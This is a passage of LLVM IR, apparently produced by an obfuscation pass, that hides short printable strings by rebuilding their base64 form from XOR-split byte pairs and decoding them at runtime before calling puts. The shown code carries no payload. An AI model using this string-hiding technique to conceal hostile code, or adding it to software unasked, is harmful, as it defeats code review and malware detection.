; Replace: store [2 x i8] c"\47\56", [2 x i8]* %sp1.75
  %sp0.263 = alloca [2 x i8]
  store [2 x i8] c"\16\11", [2 x i8]* %sp0.263
  %sp0.1.263 = bitcast [2 x i8]* %sp0.263 to i16*
  %i0.263 = load i16, i16* %sp0.1.263

  %sp1.263 = alloca [2 x i8]
  store [2 x i8] c"\51\47", [2 x i8]* %sp1.263
  %sp1.1.263 = bitcast [2 x i8]* %sp1.263 to i16*
  %i1.263 = load i16, i16* %sp1.1.263

  %xp263 = xor i16 %i0.263, %i1.263

  %fi.263 = alloca i16
  store i16 %xp263, i16* %fi.263

  %final.ptr.263 = bitcast i16* %fi.263 to [2 x i8]*
  %spi263 = load [2 x i8], [2 x i8]* %final.ptr.263
  store [2 x i8] %spi263, [2 x i8]* %sp1.75
;-------------------------------
  %next1.75 = getelementptr [17 x i8], [17 x i8]* %sp75, i32 0, i32 3
  
  %sp2.75 = bitcast i8* %next1.75 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\79\5a", [2 x i8]* %sp2.75
  %sp0.264 = alloca [2 x i8]
  store [2 x i8] c"\38\0C", [2 x i8]* %sp0.264
  %sp0.1.264 = bitcast [2 x i8]* %sp0.264 to i16*
  %i0.264 = load i16, i16* %sp0.1.264

  %sp1.264 = alloca [2 x i8]
  store [2 x i8] c"\41\56", [2 x i8]* %sp1.264
  %sp1.1.264 = bitcast [2 x i8]* %sp1.264 to i16*
  %i1.264 = load i16, i16* %sp1.1.264

  %xp264 = xor i16 %i0.264, %i1.264

  %fi.264 = alloca i16
  store i16 %xp264, i16* %fi.264

  %final.ptr.264 = bitcast i16* %fi.264 to [2 x i8]*
  %spi264 = load [2 x i8], [2 x i8]* %final.ptr.264
  store [2 x i8] %spi264, [2 x i8]* %sp2.75
;-------------------------------
  %next2.75 = getelementptr [17 x i8], [17 x i8]* %sp75, i32 0, i32 5
  
  %sp3.75 = bitcast i8* %next2.75 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\32\4a", [2 x i8]* %sp3.75
  %sp0.265 = alloca [2 x i8]
  store [2 x i8] c"\41\73", [2 x i8]* %sp0.265
  %sp0.1.265 = bitcast [2 x i8]* %sp0.265 to i16*
  %i0.265 = load i16, i16* %sp0.1.265

  %sp1.265 = alloca [2 x i8]
  store [2 x i8] c"\73\39", [2 x i8]* %sp1.265
  %sp1.1.265 = bitcast [2 x i8]* %sp1.265 to i16*
  %i1.265 = load i16, i16* %sp1.1.265

  %xp265 = xor i16 %i0.265, %i1.265

  %fi.265 = alloca i16
  store i16 %xp265, i16* %fi.265

  %final.ptr.265 = bitcast i16* %fi.265 to [2 x i8]*
  %spi265 = load [2 x i8], [2 x i8]* %final.ptr.265
  store [2 x i8] %spi265, [2 x i8]* %sp3.75
;-------------------------------
  %next3.75 = getelementptr [17 x i8], [17 x i8]* %sp75, i32 0, i32 7
  
  %sp4.75 = bitcast i8* %next3.75 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\71\65", [2 x i8]* %sp4.75
  %sp0.266 = alloca [2 x i8]
  store [2 x i8] c"\48\1C", [2 x i8]* %sp0.266
  %sp0.1.266 = bitcast [2 x i8]* %sp0.266 to i16*
  %i0.266 = load i16, i16* %sp0.1.266

  %sp1.266 = alloca [2 x i8]
  store [2 x i8] c"\39\79", [2 x i8]* %sp1.266
  %sp1.1.266 = bitcast [2 x i8]* %sp1.266 to i16*
  %i1.266 = load i16, i16* %sp1.1.266

  %xp266 = xor i16 %i0.266, %i1.266

  %fi.266 = alloca i16
  store i16 %xp266, i16* %fi.266

  %final.ptr.266 = bitcast i16* %fi.266 to [2 x i8]*
  %spi266 = load [2 x i8], [2 x i8]* %final.ptr.266
  store [2 x i8] %spi266, [2 x i8]* %sp4.75
;-------------------------------
  %next4.75 = getelementptr [17 x i8], [17 x i8]* %sp75, i32 0, i32 9
  
  %sp5.75 = bitcast i8* %next4.75 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\6d\56", [2 x i8]* %sp5.75
  %sp0.267 = alloca [2 x i8]
  store [2 x i8] c"\5F\14", [2 x i8]* %sp0.267
  %sp0.1.267 = bitcast [2 x i8]* %sp0.267 to i16*
  %i0.267 = load i16, i16* %sp0.1.267

  %sp1.267 = alloca [2 x i8]
  store [2 x i8] c"\32\42", [2 x i8]* %sp1.267
  %sp1.1.267 = bitcast [2 x i8]* %sp1.267 to i16*
  %i1.267 = load i16, i16* %sp1.1.267

  %xp267 = xor i16 %i0.267, %i1.267

  %fi.267 = alloca i16
  store i16 %xp267, i16* %fi.267

  %final.ptr.267 = bitcast i16* %fi.267 to [2 x i8]*
  %spi267 = load [2 x i8], [2 x i8]* %final.ptr.267
  store [2 x i8] %spi267, [2 x i8]* %sp5.75
;-------------------------------
  %next5.75 = getelementptr [17 x i8], [17 x i8]* %sp75, i32 0, i32 11
  
  %sp6.75 = bitcast i8* %next5.75 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\72\59", [2 x i8]* %sp6.75
  %sp0.268 = alloca [2 x i8]
  store [2 x i8] c"\0A\11", [2 x i8]* %sp0.268
  %sp0.1.268 = bitcast [2 x i8]* %sp0.268 to i16*
  %i0.268 = load i16, i16* %sp0.1.268

  %sp1.268 = alloca [2 x i8]
  store [2 x i8] c"\78\48", [2 x i8]* %sp1.268
  %sp1.1.268 = bitcast [2 x i8]* %sp1.268 to i16*
  %i1.268 = load i16, i16* %sp1.1.268

  %xp268 = xor i16 %i0.268, %i1.268

  %fi.268 = alloca i16
  store i16 %xp268, i16* %fi.268

  %final.ptr.268 = bitcast i16* %fi.268 to [2 x i8]*
  %spi268 = load [2 x i8], [2 x i8]* %final.ptr.268
  store [2 x i8] %spi268, [2 x i8]* %sp6.75
;-------------------------------
  %next6.75 = getelementptr [17 x i8], [17 x i8]* %sp75, i32 0, i32 13
  
  %sp7.75 = bitcast i8* %next6.75 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\51\41", [2 x i8]* %sp7.75
  %sp0.269 = alloca [2 x i8]
  store [2 x i8] c"\30\20", [2 x i8]* %sp0.269
  %sp0.1.269 = bitcast [2 x i8]* %sp0.269 to i16*
  %i0.269 = load i16, i16* %sp0.1.269

  %sp1.269 = alloca [2 x i8]
  store [2 x i8] c"\61\61", [2 x i8]* %sp1.269
  %sp1.1.269 = bitcast [2 x i8]* %sp1.269 to i16*
  %i1.269 = load i16, i16* %sp1.1.269

  %xp269 = xor i16 %i0.269, %i1.269

  %fi.269 = alloca i16
  store i16 %xp269, i16* %fi.269

  %final.ptr.269 = bitcast i16* %fi.269 to [2 x i8]*
  %spi269 = load [2 x i8], [2 x i8]* %final.ptr.269
  store [2 x i8] %spi269, [2 x i8]* %sp7.75
;-------------------------------
  %next7.75 = getelementptr [17 x i8], [17 x i8]* %sp75, i32 0, i32 15
  
  %sp8.75 = bitcast i8* %next7.75 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\3d\00", [2 x i8]* %sp8.75
  %sp0.270 = alloca [2 x i8]
  store [2 x i8] c"\0F\33", [2 x i8]* %sp0.270
  %sp0.1.270 = bitcast [2 x i8]* %sp0.270 to i16*
  %i0.270 = load i16, i16* %sp0.1.270

  %sp1.270 = alloca [2 x i8]
  store [2 x i8] c"\32\33", [2 x i8]* %sp1.270
  %sp1.1.270 = bitcast [2 x i8]* %sp1.270 to i16*
  %i1.270 = load i16, i16* %sp1.1.270

  %xp270 = xor i16 %i0.270, %i1.270

  %fi.270 = alloca i16
  store i16 %xp270, i16* %fi.270

  %final.ptr.270 = bitcast i16* %fi.270 to [2 x i8]*
  %spi270 = load [2 x i8], [2 x i8]* %final.ptr.270
  store [2 x i8] %spi270, [2 x i8]* %sp8.75
;-------------------------------

  %spi75 = load [17 x i8], [17 x i8]* %sp75
  store [17 x i8] %spi75, [17 x i8]* %cipher.ptr.38
;-------------------------------
  %cipher.38 = getelementptr inbounds [17 x i8], [17 x i8]* %cipher.ptr.38, i32 0, i32 0
  %plain.ptr.38 = tail call i8* @base64_decode(i8* %cipher.38)
  %spi38 = bitcast i8* %plain.ptr.38 to [11 x i8]*
  %cast22= getelementptr [11 x i8], [11 x i8]* %spi38, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast22)
  br label %next22
BB_24:
;-------------------------------
; Replace: %cast24= getelementptr [10 x i8], [10 x i8]* @.str23, i64 0, i64 0
  %cipher.ptr.39 = alloca [17 x i8]
;-------------------------------
; Replace: store [17 x i8] c"\52\47\56\31\65\47\6e\44\71\47\31\6c\41\41\3d\3d\00", [17 x i8]* %cipher.ptr.39
  %sp76 = alloca [17 x i8]

  
  %sp0.76 = bitcast [17 x i8]* %sp76 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\52", [1 x i8]* %sp0.76
  %sp0.271 = alloca [1 x i8]
  store [1 x i8] c"\3C", [1 x i8]* %sp0.271
  %sp0.1.271 = bitcast [1 x i8]* %sp0.271 to i8*
  %i0.271 = load i8, i8* %sp0.1.271

  %sp1.271 = alloca [1 x i8]
  store [1 x i8] c"\6e", [1 x i8]* %sp1.271
  %sp1.1.271 = bitcast [1 x i8]* %sp1.271 to i8*
  %i1.271 = load i8, i8* %sp1.1.271

  %xp271 = xor i8 %i0.271, %i1.271

  %fi.271 = alloca i8
  store i8 %xp271, i8* %fi.271

  %final.ptr.271 = bitcast i8* %fi.271 to [1 x i8]*
  %spi271 = load [1 x i8], [1 x i8]* %final.ptr.271
  store [1 x i8] %spi271, [1 x i8]* %sp0.76
;-------------------------------
  %next0.76 = getelementptr [17 x i8], [17 x i8]* %sp76, i32 0, i32 1
  
  %sp1.76 = bitcast i8* %next0.76 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\47\56", [2 x i8]* %sp1.76
  %sp0.272 = alloca [2 x i8]
  store [2 x i8] c"\00\1F", [2 x i8]* %sp0.272
  %sp0.1.272 = bitcast [2 x i8]* %sp0.272 to i16*
  %i0.272 = load i16, i16* %sp0.1.272

  %sp1.272 = alloca [2 x i8]
  store [2 x i8] c"\47\49", [2 x i8]* %sp1.272
  %sp1.1.272 = bitcast [2 x i8]* %sp1.272 to i16*
  %i1.272 = load i16, i16* %sp1.1.272

  %xp272 = xor i16 %i0.272, %i1.272

  %fi.272 = alloca i16
  store i16 %xp272, i16* %fi.272

  %final.ptr.272 = bitcast i16* %fi.272 to [2 x i8]*
  %spi272 = load [2 x i8], [2 x i8]* %final.ptr.272
  store [2 x i8] %spi272, [2 x i8]* %sp1.76
;-------------------------------
  %next1.76 = getelementptr [17 x i8], [17 x i8]* %sp76, i32 0, i32 3
  
  %sp2.76 = bitcast i8* %next1.76 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\31\65", [2 x i8]* %sp2.76
  %sp0.273 = alloca [2 x i8]
  store [2 x i8] c"\04\50", [2 x i8]* %sp0.273
  %sp0.1.273 = bitcast [2 x i8]* %sp0.273 to i16*
  %i0.273 = load i16, i16* %sp0.1.273

  %sp1.273 = alloca [2 x i8]
  store [2 x i8] c"\35\35", [2 x i8]* %sp1.273
  %sp1.1.273 = bitcast [2 x i8]* %sp1.273 to i16*
  %i1.273 = load i16, i16* %sp1.1.273

  %xp273 = xor i16 %i0.273, %i1.273

  %fi.273 = alloca i16
  store i16 %xp273, i16* %fi.273

  %final.ptr.273 = bitcast i16* %fi.273 to [2 x i8]*
  %spi273 = load [2 x i8], [2 x i8]* %final.ptr.273
  store [2 x i8] %spi273, [2 x i8]* %sp2.76
;-------------------------------
  %next2.76 = getelementptr [17 x i8], [17 x i8]* %sp76, i32 0, i32 5
  
  %sp3.76 = bitcast i8* %next2.76 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\47\6e", [2 x i8]* %sp3.76
  %sp0.274 = alloca [2 x i8]
  store [2 x i8] c"\7F\01", [2 x i8]* %sp0.274
  %sp0.1.274 = bitcast [2 x i8]* %sp0.274 to i16*
  %i0.274 = load i16, i16* %sp0.1.274

  %sp1.274 = alloca [2 x i8]
  store [2 x i8] c"\38\6f", [2 x i8]* %sp1.274
  %sp1.1.274 = bitcast [2 x i8]* %sp1.274 to i16*
  %i1.274 = load i16, i16* %sp1.1.274

  %xp274 = xor i16 %i0.274, %i1.274

  %fi.274 = alloca i16
  store i16 %xp274, i16* %fi.274

  %final.ptr.274 = bitcast i16* %fi.274 to [2 x i8]*
  %spi274 = load [2 x i8], [2 x i8]* %final.ptr.274
  store [2 x i8] %spi274, [2 x i8]* %sp3.76
;-------------------------------
  %next3.76 = getelementptr [17 x i8], [17 x i8]* %sp76, i32 0, i32 7
  
  %sp4.76 = bitcast i8* %next3.76 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\44\71", [2 x i8]* %sp4.76
  %sp0.275 = alloca [2 x i8]
  store [2 x i8] c"\05\25", [2 x i8]* %sp0.275
  %sp0.1.275 = bitcast [2 x i8]* %sp0.275 to i16*
  %i0.275 = load i16, i16* %sp0.1.275

  %sp1.275 = alloca [2 x i8]
  store [2 x i8] c"\41\54", [2 x i8]* %sp1.275
  %sp1.1.275 = bitcast [2 x i8]* %sp1.275 to i16*
  %i1.275 = load i16, i16* %sp1.1.275

  %xp275 = xor i16 %i0.275, %i1.275

  %fi.275 = alloca i16
  store i16 %xp275, i16* %fi.275

  %final.ptr.275 = bitcast i16* %fi.275 to [2 x i8]*
  %spi275 = load [2 x i8], [2 x i8]* %final.ptr.275
  store [2 x i8] %spi275, [2 x i8]* %sp4.76
;-------------------------------
  %next4.76 = getelementptr [17 x i8], [17 x i8]* %sp76, i32 0, i32 9
  
  %sp5.76 = bitcast i8* %next4.76 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\47\31", [2 x i8]* %sp5.76
  %sp0.276 = alloca [2 x i8]
  store [2 x i8] c"\24\5C", [2 x i8]* %sp0.276
  %sp0.1.276 = bitcast [2 x i8]* %sp0.276 to i16*
  %i0.276 = load i16, i16* %sp0.1.276

  %sp1.276 = alloca [2 x i8]
  store [2 x i8] c"\63\6d", [2 x i8]* %sp1.276
  %sp1.1.276 = bitcast [2 x i8]* %sp1.276 to i16*
  %i1.276 = load i16, i16* %sp1.1.276

  %xp276 = xor i16 %i0.276, %i1.276

  %fi.276 = alloca i16
  store i16 %xp276, i16* %fi.276

  %final.ptr.276 = bitcast i16* %fi.276 to [2 x i8]*
  %spi276 = load [2 x i8], [2 x i8]* %final.ptr.276
  store [2 x i8] %spi276, [2 x i8]* %sp5.76
;-------------------------------
  %next5.76 = getelementptr [17 x i8], [17 x i8]* %sp76, i32 0, i32 11
  
  %sp6.76 = bitcast i8* %next5.76 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\6c\41", [2 x i8]* %sp6.76
  %sp0.277 = alloca [2 x i8]
  store [2 x i8] c"\06\0D", [2 x i8]* %sp0.277
  %sp0.1.277 = bitcast [2 x i8]* %sp0.277 to i16*
  %i0.277 = load i16, i16* %sp0.1.277

  %sp1.277 = alloca [2 x i8]
  store [2 x i8] c"\6a\4c", [2 x i8]* %sp1.277
  %sp1.1.277 = bitcast [2 x i8]* %sp1.277 to i16*
  %i1.277 = load i16, i16* %sp1.1.277

  %xp277 = xor i16 %i0.277, %i1.277

  %fi.277 = alloca i16
  store i16 %xp277, i16* %fi.277

  %final.ptr.277 = bitcast i16* %fi.277 to [2 x i8]*
  %spi277 = load [2 x i8], [2 x i8]* %final.ptr.277
  store [2 x i8] %spi277, [2 x i8]* %sp6.76
;-------------------------------
  %next6.76 = getelementptr [17 x i8], [17 x i8]* %sp76, i32 0, i32 13
  
  %sp7.76 = bitcast i8* %next6.76 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\41\3d", [2 x i8]* %sp7.76
  %sp0.278 = alloca [2 x i8]
  store [2 x i8] c"\00\78", [2 x i8]* %sp0.278
  %sp0.1.278 = bitcast [2 x i8]* %sp0.278 to i16*
  %i0.278 = load i16, i16* %sp0.1.278

  %sp1.278 = alloca [2 x i8]
  store [2 x i8] c"\41\45", [2 x i8]* %sp1.278
  %sp1.1.278 = bitcast [2 x i8]* %sp1.278 to i16*
  %i1.278 = load i16, i16* %sp1.1.278

  %xp278 = xor i16 %i0.278, %i1.278

  %fi.278 = alloca i16
  store i16 %xp278, i16* %fi.278

  %final.ptr.278 = bitcast i16* %fi.278 to [2 x i8]*
  %spi278 = load [2 x i8], [2 x i8]* %final.ptr.278
  store [2 x i8] %spi278, [2 x i8]* %sp7.76
;-------------------------------
  %next7.76 = getelementptr [17 x i8], [17 x i8]* %sp76, i32 0, i32 15
  
  %sp8.76 = bitcast i8* %next7.76 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\3d\00", [2 x i8]* %sp8.76
  %sp0.279 = alloca [2 x i8]
  store [2 x i8] c"\68\4C", [2 x i8]* %sp0.279
  %sp0.1.279 = bitcast [2 x i8]* %sp0.279 to i16*
  %i0.279 = load i16, i16* %sp0.1.279

  %sp1.279 = alloca [2 x i8]
  store [2 x i8] c"\55\4c", [2 x i8]* %sp1.279
  %sp1.1.279 = bitcast [2 x i8]* %sp1.279 to i16*
  %i1.279 = load i16, i16* %sp1.1.279

  %xp279 = xor i16 %i0.279, %i1.279

  %fi.279 = alloca i16
  store i16 %xp279, i16* %fi.279

  %final.ptr.279 = bitcast i16* %fi.279 to [2 x i8]*
  %spi279 = load [2 x i8], [2 x i8]* %final.ptr.279
  store [2 x i8] %spi279, [2 x i8]* %sp8.76
;-------------------------------

  %spi76 = load [17 x i8], [17 x i8]* %sp76
  store [17 x i8] %spi76, [17 x i8]* %cipher.ptr.39
;-------------------------------
  %cipher.39 = getelementptr inbounds [17 x i8], [17 x i8]* %cipher.ptr.39, i32 0, i32 0
  %plain.ptr.39 = tail call i8* @base64_decode(i8* %cipher.39)
  %spi39 = bitcast i8* %plain.ptr.39 to [10 x i8]*
  %cast24= getelementptr [10 x i8], [10 x i8]* %spi39, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast24)
  br label %next24
BB_26:
;-------------------------------
; Replace: %cast26= getelementptr [11 x i8], [11 x i8]* @.str25, i64 0, i64 0
  %cipher.ptr.40 = alloca [17 x i8]
;-------------------------------
; Replace: store [17 x i8] c"\5a\47\56\79\5a\32\4a\71\65\6d\56\72\59\51\41\3d\00", [17 x i8]* %cipher.ptr.40
  %sp77 = alloca [17 x i8]

  
  %sp0.77 = bitcast [17 x i8]* %sp77 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\5a", [1 x i8]* %sp0.77
  %sp0.280 = alloca [1 x i8]
  store [1 x i8] c"\22", [1 x i8]* %sp0.280
  %sp0.1.280 = bitcast [1 x i8]* %sp0.280 to i8*
  %i0.280 = load i8, i8* %sp0.1.280

  %sp1.280 = alloca [1 x i8]
  store [1 x i8] c"\78", [1 x i8]* %sp1.280
  %sp1.1.280 = bitcast [1 x i8]* %sp1.280 to i8*
  %i1.280 = load i8, i8* %sp1.1.280

  %xp280 = xor i8 %i0.280, %i1.280

  %fi.280 = alloca i8
  store i8 %xp280, i8* %fi.280

  %final.ptr.280 = bitcast i8* %fi.280 to [1 x i8]*
  %spi280 = load [1 x i8], [1 x i8]* %final.ptr.280
  store [1 x i8] %spi280, [1 x i8]* %sp0.77
;-------------------------------
  %next0.77 = getelementptr [17 x i8], [17 x i8]* %sp77, i32 0, i32 1
  
  %sp1.77 = bitcast i8* %next0.77 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\47\56", [2 x i8]* %sp1.77
  %sp0.281 = alloca [2 x i8]
  store [2 x i8] c"\2A\01", [2 x i8]* %sp0.281
  %sp0.1.281 = bitcast [2 x i8]* %sp0.281 to i16*
  %i0.281 = load i16, i16* %sp0.1.281

  %sp1.281 = alloca [2 x i8]
  store [2 x i8] c"\6d\57", [2 x i8]* %sp1.281
  %sp1.1.281 = bitcast [2 x i8]* %sp1.281 to i16*
  %i1.281 = load i16, i16* %sp1.1.281

  %xp281 = xor i16 %i0.281, %i1.281

  %fi.281 = alloca i16
  store i16 %xp281, i16* %fi.281

  %final.ptr.281 = bitcast i16* %fi.281 to [2 x i8]*
  %spi281 = load [2 x i8], [2 x i8]* %final.ptr.281
  store [2 x i8] %spi281, [2 x i8]* %sp1.77
;-------------------------------
  %next1.77 = getelementptr [17 x i8], [17 x i8]* %sp77, i32 0, i32 3
  
  %sp2.77 = bitcast i8* %next1.77 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\79\5a", [2 x i8]* %sp2.77
  %sp0.282 = alloca [2 x i8]
  store [2 x i8] c"\1E\2D", [2 x i8]* %sp0.282
  %sp0.1.282 = bitcast [2 x i8]* %sp0.282 to i16*
  %i0.282 = load i16, i16* %sp0.1.282

  %sp1.282 = alloca [2 x i8]
  store [2 x i8] c"\67\77", [2 x i8]* %sp1.282
  %sp1.1.282 = bitcast [2 x i8]* %sp1.282 to i16*
  %i1.282 = load i16, i16* %sp1.1.282

  %xp282 = xor i16 %i0.282, %i1.282

  %fi.282 = alloca i16
  store i16 %xp282, i16* %fi.282

  %final.ptr.282 = bitcast i16* %fi.282 to [2 x i8]*
  %spi282 = load [2 x i8], [2 x i8]* %final.ptr.282
  store [2 x i8] %spi282, [2 x i8]* %sp2.77
;-------------------------------
  %next2.77 = getelementptr [17 x i8], [17 x i8]* %sp77, i32 0, i32 5
  
  %sp3.77 = bitcast i8* %next2.77 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\32\4a", [2 x i8]* %sp3.77
  %sp0.283 = alloca [2 x i8]
  store [2 x i8] c"\01\3C", [2 x i8]* %sp0.283
  %sp0.1.283 = bitcast [2 x i8]* %sp0.283 to i16*
  %i0.283 = load i16, i16* %sp0.1.283

  %sp1.283 = alloca [2 x i8]
  store [2 x i8] c"\33\76", [2 x i8]* %sp1.283
  %sp1.1.283 = bitcast [2 x i8]* %sp1.283 to i16*
  %i1.283 = load i16, i16* %sp1.1.283

  %xp283 = xor i16 %i0.283, %i1.283

  %fi.283 = alloca i16
  store i16 %xp283, i16* %fi.283

  %final.ptr.283 = bitcast i16* %fi.283 to [2 x i8]*
  %spi283 = load [2 x i8], [2 x i8]* %final.ptr.283
  store [2 x i8] %spi283, [2 x i8]* %sp3.77
;-------------------------------
  %next3.77 = getelementptr [17 x i8], [17 x i8]* %sp77, i32 0, i32 7
  
  %sp4.77 = bitcast i8* %next3.77 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\71\65", [2 x i8]* %sp4.77
  %sp0.284 = alloca [2 x i8]
  store [2 x i8] c"\16\14", [2 x i8]* %sp0.284
  %sp0.1.284 = bitcast [2 x i8]* %sp0.284 to i16*
  %i0.284 = load i16, i16* %sp0.1.284

  %sp1.284 = alloca [2 x i8]
  store [2 x i8] c"\67\71", [2 x i8]* %sp1.284
  %sp1.1.284 = bitcast [2 x i8]* %sp1.284 to i16*
  %i1.284 = load i16, i16* %sp1.1.284

  %xp284 = xor i16 %i0.284, %i1.284

  %fi.284 = alloca i16
  store i16 %xp284, i16* %fi.284

  %final.ptr.284 = bitcast i16* %fi.284 to [2 x i8]*
  %spi284 = load [2 x i8], [2 x i8]* %final.ptr.284
  store [2 x i8] %spi284, [2 x i8]* %sp4.77
;-------------------------------
  %next4.77 = getelementptr [17 x i8], [17 x i8]* %sp77, i32 0, i32 9
  
  %sp5.77 = bitcast i8* %next4.77 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\6d\56", [2 x i8]* %sp5.77
  %sp0.285 = alloca [2 x i8]
  store [2 x i8] c"\3A\22", [2 x i8]* %sp0.285
  %sp0.1.285 = bitcast [2 x i8]* %sp0.285 to i16*
  %i0.285 = load i16, i16* %sp0.1.285

  %sp1.285 = alloca [2 x i8]
  store [2 x i8] c"\57\74", [2 x i8]* %sp1.285
  %sp1.1.285 = bitcast [2 x i8]* %sp1.285 to i16*
  %i1.285 = load i16, i16* %sp1.1.285

  %xp285 = xor i16 %i0.285, %i1.285

  %fi.285 = alloca i16
  store i16 %xp285, i16* %fi.285

  %final.ptr.285 = bitcast i16* %fi.285 to [2 x i8]*
  %spi285 = load [2 x i8], [2 x i8]* %final.ptr.285
  store [2 x i8] %spi285, [2 x i8]* %sp5.77
;-------------------------------
  %next5.77 = getelementptr [17 x i8], [17 x i8]* %sp77, i32 0, i32 11
  
  %sp6.77 = bitcast i8* %next5.77 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\72\59", [2 x i8]* %sp6.77
  %sp0.286 = alloca [2 x i8]
  store [2 x i8] c"\3E\1F", [2 x i8]* %sp0.286
  %sp0.1.286 = bitcast [2 x i8]* %sp0.286 to i16*
  %i0.286 = load i16, i16* %sp0.1.286

  %sp1.286 = alloca [2 x i8]
  store [2 x i8] c"\4c\46", [2 x i8]* %sp1.286
  %sp1.1.286 = bitcast [2 x i8]* %sp1.286 to i16*
  %i1.286 = load i16, i16* %sp1.1.286

  %xp286 = xor i16 %i0.286, %i1.286

  %fi.286 = alloca i16
  store i16 %xp286, i16* %fi.286

  %final.ptr.286 = bitcast i16* %fi.286 to [2 x i8]*
  %spi286 = load [2 x i8], [2 x i8]* %final.ptr.286
  store [2 x i8] %spi286, [2 x i8]* %sp6.77
;-------------------------------
  %next6.77 = getelementptr [17 x i8], [17 x i8]* %sp77, i32 0, i32 13
  
  %sp7.77 = bitcast i8* %next6.77 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\51\41", [2 x i8]* %sp7.77
  %sp0.287 = alloca [2 x i8]
  store [2 x i8] c"\65\71", [2 x i8]* %sp0.287
  %sp0.1.287 = bitcast [2 x i8]* %sp0.287 to i16*
  %i0.287 = load i16, i16* %sp0.1.287

  %sp1.287 = alloca [2 x i8]
  store [2 x i8] c"\34\30", [2 x i8]* %sp1.287
  %sp1.1.287 = bitcast [2 x i8]* %sp1.287 to i16*
  %i1.287 = load i16, i16* %sp1.1.287

  %xp287 = xor i16 %i0.287, %i1.287

  %fi.287 = alloca i16
  store i16 %xp287, i16* %fi.287

  %final.ptr.287 = bitcast i16* %fi.287 to [2 x i8]*
  %spi287 = load [2 x i8], [2 x i8]* %final.ptr.287
  store [2 x i8] %spi287, [2 x i8]* %sp7.77
;-------------------------------
  %next7.77 = getelementptr [17 x i8], [17 x i8]* %sp77, i32 0, i32 15
  
  %sp8.77 = bitcast i8* %next7.77 to [2 x i8]*
;-------------------------------
; Replace: store [2 x i8] c"\3d\00", [2 x i8]* %sp8.77
  %sp0.288 = alloca [2 x i8]
  store [2 x i8] c"\6E\54", [2 x i8]* %sp0.288
  %sp0.1.288 = bitcast [2 x i8]* %sp0.288 to i16*
  %i0.288 = load i16, i16* %sp0.1.288

  %sp1.288 = alloca [2 x i8]
  store [2 x i8] c"\53\54", [2 x i8]* %sp1.288
  %sp1.1.288 = bitcast [2 x i8]* %sp1.288 to i16*
  %i1.288 = load i16, i16* %sp1.1.288

  %xp288 = xor i16 %i0.288, %i1.288

  %fi.288 = alloca i16
  store i16 %xp288, i16* %fi.288

  %final.ptr.288 = bitcast i16* %fi.288 to [2 x i8]*
  %spi288 = load [2 x i8], [2 x i8]* %final.ptr.288
  store [2 x i8] %spi288, [2 x i8]* %sp8.77
;-------------------------------

  %spi77 = load [17 x i8], [17 x i8]* %sp77
  store [17 x i8] %spi77, [17 x i8]* %cipher.ptr.40
;-------------------------------
  %cipher.40 = getelementptr inbounds [17 x i8], [17 x i8]* %cipher.ptr.40, i32 0, i32 0
  %plain.ptr.40 = tail call i8* @base64_decode(i8* %cipher.40)
  %spi40 = bitcast i8* %plain.ptr.40 to [11 x i8]*
  %cast26= getelementptr [11 x i8], [11 x i8]* %spi40, i64 0, i64 0
;-------------------------------
  call i32 @puts(i8* %cast26)
  br label %next26
.escape.27:
  ret void
BB_82:
  ret void
.escape.91:
  ret void
}

attributes #0 = { mustprogress nofree norecurse nosync nounwind uwtable willreturn "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" }
attributes #1 = { mustprogress nofree norecurse nosync nounwind uwtable willreturn writeonly "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" }
attributes #2 = { naked noinline "frame-pointer"="none" "no-builtins" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="pentium4" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { mustprogress nounwind uwtable "frame-pointer"="none" "min-legal-vector-width"="0" "no-builtins" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="pentium4" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nosync nounwind willreturn }
attributes #5 = { norecurse nounwind uwtable "frame-pointer"="none" "no-builtins" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="pentium4" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { nofree nosync nounwind readnone willreturn }
attributes #7 = { noinline }
attributes #8 = { norecurse }
attributes #9 = { nounwind readnone }
attributes #10 = { nounwind }
attributes #11 = { nobuiltin nounwind "no-builtins" }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}
!llvm.module.flags = !{!1, !2, !3, !4, !5}

!0 = !{!"clang version 14.0.0"}
!1 = !{i32 1, !"wchar_size", i32 4}
